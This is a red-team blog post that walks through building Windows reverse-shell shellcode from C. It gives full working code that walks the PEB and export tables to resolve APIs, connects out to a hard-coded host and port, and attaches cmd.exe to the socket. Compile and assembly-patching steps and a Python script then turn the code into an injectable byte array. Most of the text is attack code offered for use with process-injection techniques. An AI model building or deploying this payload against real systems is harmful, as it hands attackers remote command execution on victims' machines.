---
layout: post
title: Shellcoding a Reverse Shell from C
subtitle: Developing position independent code to connect to a reverse shell
tags: [red team, malware development]
---

Final position independent reverse shell code, along with a python3 tool to automate most of the steps can be found here: [https://github.com/0xEcto/Shellcode-Generate/blob/main/code_templates/rev_shell.c](https://github.com/0xEcto/Shellcode-Generate/blob/main/code_templates/rev_shell.c)

## Intro

Shellcode is a specialized type of standalone code that is designed to be used as a
payload, usually in different types of security assessments. Its primary function is to be
injected into a running application where it is then executed by either exploiting a
vulnerability within that application or injecting it from a separate executable by
leveraging different Windows APIs. A critical characteristic of shellcode is that it must
be capable of execution regardless of its location in memory, this is later referred to as
position independent code (PIC). PIC requires meticulous programming to ensure that
it doesn't contain any fixed or hard coded memory address references, and to instead
use relative addressing or calculate addresses dynamically to maintain its position
independence.

There are a countless number of process injection techniques that make use of shellcode, as well as various general shellcode execution techniques. Many of these techniques are specifically designed to bypass security measures such as anti-virus (AV) software and endpoint detection and response (EDR) products. Being able to write custom shellcode becomes highly advantageous because the capability grants flexibility in determining what specific actions you want the injected process to perform.

While there are existing tools for generating shellcode, such as MSFVenom, these tools have signatures that are well-known. As a result, they are often detected for both pre and post execution. The focus of this writeup, however, is not on creating AV/EDR evasive shellcode. Rather, it aims to provide detailed information on how to write position-independent code (PIC), and how to compile this code to generate shellcode that can be utilized in a variety of techniques. 

## Walking the PEB

The process environment block (PEB) is a crucial data structure in the Windows operating system that contains information about a process. It is used by the Windows kernel as well as various user-mode components to manage and maintain the state of a process. The PEB is initialized when a process is created and it contains information such as the process heap, loaded modules (DLLs), environment variables, and other essential data that is utilized by the process during execution. The PEB structure is located in the user-mode address space of a process, making it accessible to user-mode code.

In the context of shellcode and position independent code (PIC), the PEB plays a significant role in ensuring that the shellcode can operate correctly regardless of its location in memory, By leveraging the PEB structure, position independent code can reliably locate necessary information without relying on hardcoded addresses. For instance, to resolve the addresses of kernel32.dll - a module with a lot of popular Windows APIs, user-mode code can traverse the PEB to find the absolute base address of the module.

To start, we need two key WinAPI functions to help refactor â€œnormal codeâ€ to position independent code:

- `LoadLibraryA` - Allows us to load other DLLs of interest
- `GetProcAddress` - Allows us to get the address of other WinAPIs

The first step is to develop a function to locate the address of `kernel32.dll` , a DLL which contains several Windows API functions that are needed throughout the code. To locate the address of a DLL by traversing the PEB the first step is to access the PEB itself which involves reading the GS register (for 64 bit architecture, FS for 32 bit), one can view the basic fields of the PEB structure by looking at the Microsoft Documentation website for PEB.Â  Within the PEB, the key field of interest is "Ldr" which points to a structure of type PEB_LDR_DATA. This structure includes both an "InMemoryOrderModuleList" and "InLoadOrderModuleList", the later is not included in the official Microsoft Documentation website so one would have to refer to a website such as Project Vergilius to view the full structure. Both module lists are doubly linked lists and one can traverse either linked list.

Once the head of a linked list of either module list has been acquired, the function should then traverse and examine each node's "LDR_DATA_TABLE_ENTRY" which represents an individual module. There are two fields of interests, the "BaseDllName" and the "DllBase." The function should compare the name of the DLL it is looking for to the "BaseDllName", and if it matches return the "DllBase", otherwise go to the next node of the linked list. Below contains a graphical reference of traversing the PEB to find a specific moduleâ€™s base address along with the corresponding C code.

![peb_module_lookup.png](https://raw.githubusercontent.com/0xEcto/0xEcto.github.io/main/images/peb_module_lookup.png)

```c

inline LPVOID get_module_by_name( wchar_t* module_name )
{
    // wprintf( L"[*] Finding address of module: %ls\n", module_name );
    //
    // Access the PEB from GS register offset x60
    // 
    PPEB peb = NULL;
    peb = ( PPEB )__readgsqword( 0x60 ); 

    //
    // Get the Ldr to find the module list
    // 
    // printf( "[*] Found address of peb->Ldr: %p\n", peb->Ldr );
    PPEB_LDR_DATA ldr = peb->Ldr;
    LIST_ENTRY module_list = ldr->InLoadOrderModuleList;

    PLDR_DATA_TABLE_ENTRY front_link = *( (PLDR_DATA_TABLE_ENTRY*)(&module_list) );
    PLDR_DATA_TABLE_ENTRY current_link = front_link;
    
    LPVOID return_module = NULL;

    // 
    // Go through the doubly linked list
    // 
    wchar_t current_module[1032];

    while( current_link != NULL && current_link->DllBase != NULL ) 
    {   
        USHORT buffer_len = current_link->BaseDllName.Length / sizeof( WCHAR );
        USHORT i = 0;

        //
        // Reset the current_module string
        //
        for( i = 0; i < 1032; i++ )
        {
            current_module[i] = '\0';
        }
        
        // printf( "[*] Found BaseDllName: " );
        
        for( i = 0; i < buffer_len; i++ )
        {
            current_module[i] = TO_LOWER( current_link->BaseDllName.Buffer[i] );
        }

        // wprintf( L"current_module: %ls\n", current_module );
        
        for( i = 0; i < buffer_len && module_name[i] != '\0'; i++ )
        {
            if( TO_LOWER( current_link->BaseDllName.Buffer[i] ) != module_name[i] )
            {
                break;
            }

            //
            // If i == buffer_len - 1 and hasn't broken out of the loop - it's the module we're looking for!
            // 
            if( i == buffer_len - 1 )
            {
                // printf("[*] Found a matching module name!\n");
                return_module = current_link->DllBase;
                return return_module;
            }
        }

        //
        // Check to make sure the next does not equal NULL
        // Might be redundant with while loop condition...
        //
        if( (PLDR_DATA_TABLE_ENTRY)current_link->InLoadOrderLinks.Flink == NULL )
        {
            break;
        }
        
        //
        // Go to next item on the linked list
        // 
        current_link = ( PLDR_DATA_TABLE_ENTRY )current_link->InLoadOrderLinks.Flink;
    }

    // printf( "[+] Error?\n" );
    return return_module;
}
```

Once the base address of a DLL has been obtained by traversing the PEB as described in the previous section, the next step in refactoring code to become position independent is the creation of a function that will get the absolute address of a function that resides within that module/DLL. This process is important for executing specific functionalities without the need for using relative addresses, meaning this would enable the program to execute from anywhere in memory.

Starting from the base address of the DLL, the function would need to parse the DLL's internal structures to find the function of interest which starts with the Portable Executable (PE) header which can be accessed directly from the DLL's base address. The PE header is an array that includes various directories but the index of interest is the one in the first index which is the Export Table. This table lists all the functions that the DLL exports along with their names and relative addresses. Once access to the Export Table has been successfully found, the code would then have to traverse through the list of exported functions where each entry in the Export Table includes the function's name and an offset from the DLL's base address. Upon comparison of the parsed function's name and the function name the code is looking for, calculation of the absolute address needs to be done by getting the offset and adding it to the base address of the DLL. Once the calculation has been completed, the code should then return the absolute address of that function which means the program can now directly call the Windows API function from anywhere in memory. The following below is the code to do this, along with a graphical representation of traversing internal structures to get to the Exports Table.

```c

//
// This function gets the function address from the module
// 
inline LPVOID get_func_by_name( LPVOID module, char* function_name )
{
    LPVOID return_address = NULL;
    
    // printf( "[*] Getting address of function: %s\n", function_name );

    // 
    // Check if magic bytes are correct ("MZ")
    // 
    IMAGE_DOS_HEADER* dos_header = ( IMAGE_DOS_HEADER* )module;
    if( dos_header->e_magic != IMAGE_DOS_SIGNATURE)
    {
        return NULL;
    }

    // printf( "[*] Magic bytes are \"MZ\"\n" );

    //
    // Get address of the PE Header (e_lfanew)
    // PE Header contains data directories, which are pointers to important data in the executable, such as the import and export tables
    //
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)module + dos_header->e_lfanew);

    // 
    // Get the exports directory - contains functions exported by the module
    // The export directory is in the 0th index of the DataDirectory
    // 
    IMAGE_DATA_DIRECTORY* exports_directory = &(nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    if (exports_directory->VirtualAddress == NULL) 
    {
        return NULL;
    }

    // printf( "[*] Found the exports directory\n" );

    //
    // Get the relative virtual address of the export table
    //
    DWORD export_table_rva = exports_directory->VirtualAddress;

    //
    // Calculate the absolute address of the export directory by adding the VirtualAddress to the base address of the module
    //
    IMAGE_EXPORT_DIRECTORY* export_table_aa = ( IMAGE_EXPORT_DIRECTORY* )( export_table_rva + (ULONG_PTR)module );
    SIZE_T namesCount = export_table_aa->NumberOfNames;

    //
    // Retrieves the number of function names
    // Also gets RVAs of lists of function addresses, function names, and name ordinals
    // 
    DWORD function_list_rva = export_table_aa->AddressOfFunctions;
    DWORD function_names_rva = export_table_aa->AddressOfNames;
    DWORD ordinal_names_rva = export_table_aa->AddressOfNameOrdinals;

    //
    // Loop through names of functions exported by module
    // Attempts to find function whose name matches the func_name parameter
    // 
    for( SIZE_T i = 0; i < namesCount; i++ )
    {
        //
        // Calculate the virtual address of the FUNCTION NAME at the i-th position in the exported names table
        //
        DWORD* name_va  = ( DWORD* )( function_names_rva + (BYTE*)module + i * sizeof(DWORD));
        
        //
        // Calculate the virtual address of the ORDINAL NUMBER of the function name at the i-th position in the exported names table
        //
        WORD* index = ( WORD* )( ordinal_names_rva + (BYTE*)module + i * sizeof(WORD));
        
        //
        // Calculate the virtual address of the FUNCTION'S ADDRESS corresponding to the i-th function name in the exported names table
        //
        DWORD* function_address_va = ( DWORD* )( function_list_rva + (BYTE*)module + (*index) * sizeof(DWORD) );

        //
        // Calculate the function name's (name_va) absolute address
        //
        LPSTR current_name = ( LPSTR )( *name_va + (BYTE*)module);
        
        //
        // Compare the characters and return if function is the module found
        //
        size_t j = 0;
        /*
        // printf( "[*] Found function: " );
        
        for( j = 0; function_name[j] != '\0' && current_name[j] != 0; j++ )
        {
            // printf( "%c", current_name[j] );
        }
        // printf( "\n" );
        */ 
        //
        // Compare the target function name to current function name
        // 
        for( j = 0; function_name[j] != '\0' && current_name[j] != 0; j++ )
        {
            if( TO_LOWER(function_name[j]) != TO_LOWER(current_name[j]) )
            {
                break;
            }

            //
            // If j = the length of both and we haven't broken out of loop, we have a matching function!
            // Return the absoluste address of the function
            //
            if( function_name[j + 1] == '\0' && current_name[j + 1] == 0 )
            {
                return_address = (BYTE*)module + (*function_address_va);
                return return_address;
            }
        }
    }

    return return_address;
}

```

![Untitled](https://raw.githubusercontent.com/0xEcto/0xEcto.github.io/main/images/export_table.png)

Now that two key functions have been developed to:

1. Get a modules address given the name
2. Get a WinAPI address given the base module address and the WinAPI name

The first key function can be used to get the address of `kernel32.dll`. Once thatâ€™s done, we can use the second key function to find two important WinAPIâ€™s within `kernel32.dll`: 

- `GetProcAddress`
- `LoadLibraryA`

These APIs will allow us to load other DLLs even if not loaded by the resulting executable and will allow us to get an WinAPI that resides within that module. The following code snippet below shows how we can obtain both WinAPIâ€™s absolute address and use that to dynamically resolve it - essentially casting the address to our own WinAPI to use which will have the same function signatures as the original.

 

```c

char get_proc_addr[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0' }; 

LPVOID getprocaddress_addr = get_func_by_name( kernel32dll_base, get_proc_addr );
if( NULL == getprocaddress_addr )
{
    // printf( "[!] Could not find function! Exiting!\n" );
    return 1;
}
// printf( "[+] Found GetProcAddress!\n" );

char load_library[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0' };    
LPVOID loadlibrarya_addr = get_func_by_name( kernel32dll_base, load_library );
if( loadlibrarya_addr == NULL )
{
    // printf( "[!] Could not find function! Exiting!\n" );
    return 1;
}
// printf( "[+] Found LoadLibraryA!\n" );

//
// Dynamically resolve LoadLibraryA/GetProcAddress
//
HMODULE( WINAPI * _LoadLibraryA )( LPCSTR lpLibFileName )                = ( HMODULE(WINAPI*)(LPCSTR))loadlibrarya_addr;
FARPROC( WINAPI * _GetProcAddress)( HMODULE hModule, LPCSTR lpProcName ) = ( FARPROC (WINAPI*)(HMODULE, LPCSTR))getprocaddress_addr;

if( NULL == _LoadLibraryA && NULL == _GetProcAddress)
{
    // printf( "[!] LoadLibraryA or GetProcAddress could not be resolved!\n" );
    return 1;
}

```

## Position Independent Code for a Reverse Shell

Once weâ€™ve dynamically resolved those two functions, we can load other modules and APIâ€™s that reside within that module. For example, for reverse shell/network operations, weâ€™ll use APIs within `ws2_32.dll` . Hereâ€™s how we can get the address of that DLL, along with `WSAStartup()` which is an API function needed for network operations.

```c

//
// Get address of ws2_32.dll
//
char ws2_32dll[] = { 'w', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', '\0' }; 
LPVOID ws2_32dll_base = _LoadLibraryA( ws2_32dll );

if( NULL == ws2_32dll_base )
{
    // printf( "[+] Could not find ws2_32.dll!\n" );
    return 1;
}

//
// 1. INITIALIZE SOCKET LIBRARY USING WSAStartup()
// Dynamically resolve WSAStartUp WinAPI
// 
char wsastartup[] = { 'W', 'S', 'A', 'S', 't', 'a', 'r', 't', 'u', 'p', '\0' };

int( WINAPI * _WSAStartup)
(
    WORD      wVersionRequired,
    LPWSADATA lpWSAData
);

_WSAStartup = ( int(WINAPI *)
(
    WORD      wVersionRequired,
    LPWSADATA lpWSAData
)) _GetProcAddress( (HMODULE)ws2_32dll_base, wsastartup );

if( NULL == _WSAStartup )
{
    // printf( "[+] Could not dynamically resolve _WSAStartup!\n" );
    return 1;
}

```

In the case of `WSAStartup`, we use a similar approach as with `GetProcAddress` and `LoadLibraryA`  to dynamically resolve the function's address:

1. Locate the Module Address: First, we obtain the absolute address of the module (`ws2_32.dll`) that contains the `WSAStartup` function, if it's not already known.
2. We declare a function pointer with a signature that matches the `WSAStartup` function, ensuring it has the correct parameters and return type as defined by the WinAPI.
3. Last we initialize the WinAPI defined int he second step using `GetProcAddress` to find the absolute address of `WSAStartup` within the module. We then cast this address to our function pointer type, allowing us to call the function dynamically at runtime.

This process can be repeated to essentially refactor code to be position independent. The follow code below is from [https://cocomelonc.github.io/tutorial/2021/09/15/simple-rev-c-1.html](https://cocomelonc.github.io/tutorial/2021/09/15/simple-rev-c-1.html) which shows how to program a reverse shell in C/C++.

```c

//
// code inspired from https://cocomelonc.github.io/tutorial/2021/09/15/simple-rev-c-1.html
// 
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32")

int main(int argc, char* argv[]) 
{
    WSADATA wsaData;
    SOCKET wSock;
    struct sockaddr_in hax;
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;

    char *ip = "192.168.1.87";
    short port = 1337;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    hax.sin_family = AF_INET;
    hax.sin_port = htons(port);
    hax.sin_addr.s_addr = inet_addr(ip);

    WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;

    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(wSock);
    WSACleanup();

    return 0;
}

```

We can refactor all of the WinAPIs used in the above code to become position indepent, similar to the example above with `WSAStartup`. Below is the code thatâ€™s been refactored to be position independent (final code, along with the header file containing the PEB structures can be found on my github [here](https://github.com/0xEcto/Shellcode-Generate/blob/main/code_templates/rev_shell.c) )

```c

#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <string.h>
#include "peb_structs.h"

// 
// Macro to convert a character to lowercase
//
#define TO_LOWER(c) ( (c >= 'A' && c <= 'Z') ? (c + 'a' - 'A') : c )
#define MAKEWORD_MACRO(a, b) ((WORD)(((BYTE)((a) & 0xff)) | ((WORD)((BYTE)((b) & 0xff))) << 8))

//
// Function prototypes for module lookup and function lookup
// 
inline LPVOID get_module_by_name( wchar_t* module_name );
inline LPVOID get_func_by_name( LPVOID module, char* function_name );

int main( void )
{
    wchar_t kernel32dll[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0' };
    LPVOID kernel32dll_base = get_module_by_name( kernel32dll );

    if( NULL == kernel32dll_base )
    {
        // printf( "[!] Could not find kernel32.dll!\n" );
        return 1;
    }

    // printf( "[+] Successfully found kernel32.dll!\n" );

    // 
    // Get GetProcAddress
    // 
    char get_proc_addr[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0' }; 

    LPVOID getprocaddress_addr = get_func_by_name( kernel32dll_base, get_proc_addr );
    if( NULL == getprocaddress_addr )
    {
        // printf( "[!] Could not find function! Exiting!\n" );
        return 1;
    }
    // printf( "[+] Found GetProcAddress!\n" );

    // 
    // Get LoadLibraryA
    //    
    char load_library[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0' };    
    LPVOID loadlibrarya_addr = get_func_by_name( kernel32dll_base, load_library );
    if( loadlibrarya_addr == NULL )
    {
        // printf( "[!] Could not find function! Exiting!\n" );
        return 1;
    }
    // printf( "[+] Found LoadLibraryA!\n" );

    //
    // Dynamically resolve LoadLibraryA/GetProcAddress
    //
    HMODULE( WINAPI * _LoadLibraryA )( LPCSTR lpLibFileName )                = ( HMODULE(WINAPI*)(LPCSTR))loadlibrarya_addr;
    FARPROC( WINAPI * _GetProcAddress)( HMODULE hModule, LPCSTR lpProcName ) = ( FARPROC (WINAPI*)(HMODULE, LPCSTR))getprocaddress_addr;

    if( NULL == _LoadLibraryA && NULL == _GetProcAddress)
    {
        // printf( "[!] LoadLibraryA or GetProcAddress could not be resolved!\n" );
        return 1;
    }

    //
    // Initialize structs and variables needed to make a connection
    // 
    WSADATA wsaData;
    SOCKET wSock;
    struct sockaddr_in hax;
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;

    char host[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '1', '\0' };
    short port = 1337;

    //
    // Get address of ws2_32.dll
    //
    char ws2_32dll[] = { 'w', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', '\0' }; 
    LPVOID ws2_32dll_base = _LoadLibraryA( ws2_32dll );

    if( NULL == ws2_32dll_base )
    {
        // printf( "[+] Could not find ws2_32.dll!\n" );
        return 1;
    }

    //
    // 1. INITIALIZE SOCKET LIBRARY USING WSAStartup()
    // Dynamically resolve WSAStartUp WinAPI
    // 
    char wsastartup[] = { 'W', 'S', 'A', 'S', 't', 'a', 'r', 't', 'u', 'p', '\0' };

    int( WINAPI * _WSAStartup)
    (
        WORD      wVersionRequired,
        LPWSADATA lpWSAData
    );

    _WSAStartup = ( int(WINAPI *)
    (
        WORD      wVersionRequired,
        LPWSADATA lpWSAData
    )) _GetProcAddress( (HMODULE)ws2_32dll_base, wsastartup );

    if( NULL == _WSAStartup )
    {
        // printf( "[+] Could not dynamically resolve _WSAStartup!\n" );
        return 1;
    }

    _WSAStartup(MAKEWORD_MACRO(2, 2), &wsaData);

    //
    // 2. CREATE A SOCKET USING WSASocketA()
    // Dynamically resolve WSASocketA() WinAPI
    // 
    char wsasocketa[] = { 'W', 'S', 'A', 'S', 'o', 'c', 'k', 'e', 't', 'A', '\0' };
    
    SOCKET( WINAPI * _WSASocketA)
    (
        int af,
        int type,
        int protocol,
        LPWSAPROTOCOL_INFO lpProtocolInfo,
        GROUP g,
        DWORD dwFlags
    );

    _WSASocketA = ( SOCKET(WINAPI *)
    (
        int af,
        int type,
        int protocol,
        LPWSAPROTOCOL_INFO lpProtocolInfo,
        GROUP g,
        DWORD dwFlags
    )) _GetProcAddress( (HMODULE)ws2_32dll_base, wsasocketa );

    if( NULL == _WSASocketA )
    {
        // printf( "[+] Could not dynamically resolve _WSASocketA!\n" );
        return 1;
    }

    wSock = _WSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );

    //
    // Dynamicaly resolve htons() function
    //
    char htons_string[] = { 'h', 't', 'o', 'n', 's', '\0' };

    u_short( WINAPI * _htons)
    (
        u_short hostshort
    );

    _htons = ( u_short(WINAPI *)
    (
        u_short hostshort
    )) _GetProcAddress( (HMODULE)ws2_32dll_base, htons_string );

    if( NULL == _htons )
    {
        // printf( "[+] Could not dynamically resolve _htons!\n" );
        return 1;
    }

    hax.sin_family = AF_INET;
    hax.sin_port = _htons(port);

    //
    // Dynamically resolve inet_addr() function
    //
    char inet_addr_string[] = { 'i', 'n', 'e', 't', '_', 'a', 'd', 'd', 'r', '\0' };

    unsigned long( WINAPI * _inet_addr)
    (
        const char *cp
    );

    _inet_addr = ( unsigned long(WINAPI *)
    (
        const char *cp
    )) _GetProcAddress( (HMODULE)ws2_32dll_base, inet_addr_string );

    if( NULL == _inet_addr )
    {
        // printf( "[+] Could not dynically resolve inet_addr!\n" );
        return 1;
    }    

    hax.sin_addr.s_addr = _inet_addr( host );

    //
    // 3. CONNECT TO A REMOTE HOST
    // Dynamically resolve WSAConnect() WinAPI
    //
    char wsaconnect_string[] = { 'W', 'S', 'A', 'C', 'o', 'n', 'n', 'e', 'c', 't', '\0' };

    int ( WINAPI * _WSAConnect)
    (
        SOCKET         s,
        const SOCKADDR *name,
        int            namelen,
        LPWSABUF       lpCallerData,
        LPWSABUF       lpCalleeData,
        LPQOS          lpSQOS,
        LPQOS          lpGQOS
    );

    _WSAConnect = ( int(WINAPI *)
    (
        SOCKET         s,
        const SOCKADDR *name,
        int            namelen,
        LPWSABUF       lpCallerData,
        LPWSABUF       lpCalleeData,
        LPQOS          lpSQOS,
        LPQOS          lpGQOS
    )) _GetProcAddress( (HMODULE)ws2_32dll_base, wsaconnect_string );

    if( NULL == _WSAConnect )
    {
        // printf( "[+] Could not dynamically resolve WSAConnect!\n" );
        return 1;
    }

    _WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    //
    // Dynamically Resolve memset()
    //
    char msvcrtdll[] = { 'm', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', '\0' };
    LPVOID msvcrtdll_base = _LoadLibraryA( msvcrtdll );

    if( NULL == msvcrtdll_base )
    {
        // printf( "[!] Could not find msvcrt.dll!\n" );
        return 1;
    }

    void * (WINAPI * _memset)
    (
        void *dest,
        int c,
        size_t count
    );

    char memset_str[] = { 'm', 'e', 'm', 's', 'e', 't', '\0' }; 
    _memset = ( void *(WINAPI*)
    (
        void *dest,
        int c,
        size_t count
    )) _GetProcAddress( (HMODULE)msvcrtdll_base, memset_str );

    if( NULL == _memset)
    {
        // printf( "[!] Could not resolve memset()\n" );
        return 1;
    }

    _memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;

    
    //
    // 4. START cmd.exe WITH REDIRECTED STREAMS TO SOCKET
    // Dynamically resolve CreateProcessA() WinAPI
    // 
    char createprocessa[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', '\0' }; 
    BOOL ( WINAPI * _CreateProcessA )
    (
        LPCSTR                lpApplicationName,
        LPSTR                 lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL                  bInheritHandles,
        DWORD                 dwCreationFlags,
        LPVOID                lpEnvironment,
        LPCSTR                lpCurrentDirectory,
        LPSTARTUPINFOA        lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
    );

    _CreateProcessA = ( BOOL(WINAPI *)
    (
        LPCSTR                lpApplicationName,
        LPSTR                 lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL                  bInheritHandles,
        DWORD                 dwCreationFlags,
        LPVOID                lpEnvironment,
        LPCSTR                lpCurrentDirectory,
        LPSTARTUPINFOA        lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
    )) _GetProcAddress( (HMODULE)kernel32dll_base, createprocessa );

    if( NULL == _CreateProcessA )
    {
        // printf( "[!] Could not dynamically resolve CreateProcess()!\n" );
        return 1;
    }

    char process[] = { 'c', 'm', 'd', '.', 'e', 'x', 'e', '\0' }; 
    _CreateProcessA(NULL, process, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);

    //
    // 5. WAIT FOR PROCESS TO EXIT (excluding for now, might not need - retest for future)
    // WaitForSingleObject(pi.hProcess, INFINITE);

    // 
    // 6. CLEAN UP
    // Dynamically resolve CloseHandle() function
    //
    char closehandle_string[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', '\0' };
    BOOL ( WINAPI * _CloseHandle )
    (
        HANDLE hObject
    );

    _CloseHandle = ( BOOL(WINAPI *)
    (
        HANDLE hObject
    )) _GetProcAddress( (HMODULE)kernel32dll_base, closehandle_string );

    if( NULL == _CloseHandle)
    {
        // printf( "[+] Could not dynamically resolve CloseHandle!\n" );
        return 1;
    }

    _CloseHandle(pi.hProcess);
    _CloseHandle(pi.hThread);
    
    //
    // Dynamically resolve closesocket() function
    //
    char closesocket_string[] = { 'c', 'l', 'o', 's', 'e', 's', 'o', 'c', 'k', 'e', 't', '\0' };
    int ( WINAPI * _closesocket )
    (
        SOCKET s
    );

    _closesocket = ( int(WINAPI * )
    (
        SOCKET s
    )) _GetProcAddress( (HMODULE)ws2_32dll_base, closesocket_string );

    if( NULL == _closesocket )
    {
        // printf( "[+] Could not dynamically resolve closesocket()!\n" );
        return 1;
    }

    _closesocket( wSock );

    //
    // Dynamically resolve WSACleanup function
    // 
    char wsacleanup_string[] = { 'W', 'S', 'A', 'C', 'l', 'e', 'a', 'n', 'u', 'p', '\0' };
    int ( WINAPI * _WSACleanup )();
    
    _WSACleanup = ( int(WINAPI *)()) _GetProcAddress( (HMODULE)ws2_32dll_base, wsacleanup_string );
    
    if( NULL == _WSACleanup )
    {
        // printf( "[+] Could not dynamically resolve WSACleanup\n" );
        return 1;
    }
    
    _WSACleanup();

    // printf( "[+] Exiting with status 0!\n" );
    return 0;
}

```

## From PIC to Shellcode

Once all the code has been refactored to be position independent, we can follow the steps listed here: [https://www.ired.team/offensive-security/code-injection-process-injection/writing-and-compiling-shellcode-in-c](https://www.ired.team/offensive-security/code-injection-process-injection/writing-and-compiling-shellcode-in-c).

Essentially:

1. Compile to ASM: `cl.exe /c /FA /GS- rev_shell.c` 
2. Remove XDATA/PDATA segments in `rev_shell.asm`
3. Remove external libaries (`INCLUDELIB LITCMT`/`INCLUDELIB OLDNAMES` at the top) in `rev_shell.asm`
4. Fix stack algiment by adding the code excerpt below in the `_TEXT SEGMENT`
5. Change the line `mov rax, QWORD PTR gs:96` to `mov rax, QWORD PTR gs:[96]` 

```assembly

; ADD THIS TO THE _TEXT SEGMENT
; https://github.com/mattifestation/PIC_Bindshell/blob/master/PIC_Bindshell/AdjustStack.asm
; AlignRSP is a simple call stub that ensures that the stack is 16-byte aligned prior
; to calling the entry point of the payload. This is necessary because 64-bit functions
; in Windows assume that they were called with 16-byte stack alignment. When amd64
; shellcode is executed, you can't be assured that you stack is 16-byte aligned. For example,
; if your shellcode lands with 8-byte stack alignment, any call to a Win32 function will likely
; crash upon calling any ASM instruction that utilizes XMM registers (which require 16-byte)
; alignment.

AlignRSP PROC
    push rsi ; Preserve RSI since we're stomping on it
    mov rsi, rsp ; Save the value of RSP so it can be restored
    and rsp, 0FFFFFFFFFFFFFFF0h ; Align RSP to 16 bytes
    sub rsp, 020h ; Allocate homing space for ExecutePayload
    call main ; Call the entry point of the payload
    mov rsp, rsi ; Restore the original value of RSP
    pop rsi ; Restore RSI
    ret ; Return to caller
AlignRSP ENDP

```

Once those steps are done, link to an exe using:  `ml64.exe rev_shell.asm /link /entry:AlignRSP` . This will compile it to an exe in which you can execute and test.

Last to extract the shellcode, you can use a tool like CFF Explorer or use the PE module within python3 to extract the shellcode from the `.text` section which will be the resulting shellcode. The following is python3 code to extract it.

{% raw %}
```python

pe = pefile.PE( "fixed_main.exe" )
text_section = next((s for s in pe.sections if s.Name.decode().strip('\x00') == '.text'), None)

if not text_section:
    print("No .text section found in the executable.")
    return

text_bytes = text_section.get_data()

print( "[+] Successfully extracted .text section from the executable" )

with open( "shellcode.text", "w" ) as file:
    c_array = ', '.join( f'0x{byte:02x}' for byte in text_bytes )
    formatted_c_array = f'unsigned char payload[] = {{ {c_array} }};'
    file.write( formatted_c_array + "\n" )

```
{% endraw %}

We can then use the shellcode in any process injection or shellcode execution technique which will connect to a reverse shell!

## Resources

- [https://www.ired.team/offensive-security/code-injection-process-injection/writing-and-compiling-shellcode-in-c](https://www.ired.team/offensive-security/code-injection-process-injection/writing-and-compiling-shellcode-in-c)
- [https://vxug.fakedoma.in/papers/VXUG/Exclusive/FromaCprojectthroughassemblytoshellcodeHasherezade.pdf](https://vxug.fakedoma.in/papers/VXUG/Exclusive/FromaCprojectthroughassemblytoshellcodeHasherezade.pdf)
- [https://cocomelonc.github.io/tutorial/2021/09/15/simple-rev-c-1.html](https://cocomelonc.github.io/tutorial/2021/09/15/simple-rev-c-1.html)
